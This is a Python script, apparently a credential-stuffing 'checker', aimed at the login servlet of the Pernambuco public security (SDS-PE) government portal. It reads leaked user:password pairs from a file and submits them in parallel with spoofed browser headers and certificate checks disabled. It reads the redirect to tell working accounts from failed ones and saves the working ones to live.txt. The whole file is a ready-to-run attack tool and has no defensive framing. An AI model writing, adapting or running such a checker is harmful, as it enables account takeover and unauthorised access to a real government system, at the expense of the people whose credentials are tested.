import requests
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init(autoreset=True)

# Configurações
MAX_THREADS = 10
TIMEOUT = 15
LOGINS_FILE = 'logins.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
ERROR_FILE = 'errors.txt'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      SDS-PE PORTAL CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def read_credentials():
    credentials = []
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    user, password = line.split(':', 1)
                    credentials.append((user.strip(), password.strip()))
        stats['total'] = len(credentials)
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
    return credentials

def get_session_cookie():
    try:
        session = requests.Session()
        response = session.get(
            "https://servicos.sds.pe.gov.br/portalsds/index.jsp",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            },
            timeout=TIMEOUT,
            verify=False
        )
        return session.cookies.get('JSESSIONID')
    except:
        return None

def check_login(user, password):
    try:
        # Primeiro obtemos o cookie de sessão
        jsessionid = get_session_cookie()
        if not jsessionid:
            return "ERROR: Failed to get session cookie"

        headers = {
            "Host": "servicos.sds.pe.gov.br",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://servicos.sds.pe.gov.br",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicos.sds.pe.gov.br/portalsds/index.jsp",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": f"JSESSIONID={jsessionid}"
        }

        data = {
            "user": user,
            "pass": password,
            "handler": "",
            "digest": "",
            "digestMasked": ""
        }

        response = requests.post(
            "https://servicos.sds.pe.gov.br/portalsds/loginAppletServlet",
            headers=headers,
            data=data,
            allow_redirects=False,
            timeout=TIMEOUT,
            verify=False
        )

        if response.status_code == 302:
            location = response.headers.get('Location', '')
            if 'PORTALSESSID' in location:
                stats['live'] += 1
                save_result(LIVE_FILE, user, password)
                return Fore.GREEN + f"✓ Live {user}:{password}"
            else:
                stats['die'] += 1
                save_result(DIE_FILE, user, password)
                return Fore.RED + f"× Die {user}:{password}"
        else:
            stats['die'] += 1
            save_result(DIE_FILE, user, password, f"HTTP {response.status_code}")
            return Fore.RED + f"× Die {user}:{password} (HTTP {response.status_code})"

    except requests.Timeout:
        stats['error'] += 1
        save_result(ERROR_FILE, user, password, "Timeout")
        return Fore.YELLOW + f"⚠ Timeout {user}:{password}"
    except requests.ConnectionError:
        stats['error'] += 1
        save_result(ERROR_FILE, user, password, "Connection Error")
        return Fore.YELLOW + f"⚠ Connection Error {user}:{password}"
    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, user, password, str(e))
        return Fore.YELLOW + f"⚠ Error {user}:{password} - {str(e)[:30]}"

def save_result(filename, user, password, error=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if error:
                f.write(f"{user}:{password} | {error}\n")
            else:
                f.write(f"{user}:{password}\n")
    except:
        pass

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    # Limpar arquivos de resultados anteriores
    for file in [LIVE_FILE, DIE_FILE, ERROR_FILE]:
        if os.path.exists(file):
            os.remove(file)

    credentials = read_credentials()
    if not credentials:
        print(Fore.RED + "Nenhuma credencial válida encontrada!")
        return

    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for user, password in credentials:
            futures.append(executor.submit(check_login, user, password))

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\n✅ Verificação concluída!")
    print(Fore.CYAN + f"Resultados salvos em:")
    print(Fore.GREEN + f"- {LIVE_FILE} (contas válidas)")
    print(Fore.RED + f"- {DIE_FILE} (contas inválidas)")
    print(Fore.YELLOW + f"- {ERROR_FILE} (erros)")

if __name__ == "__main__":
    main()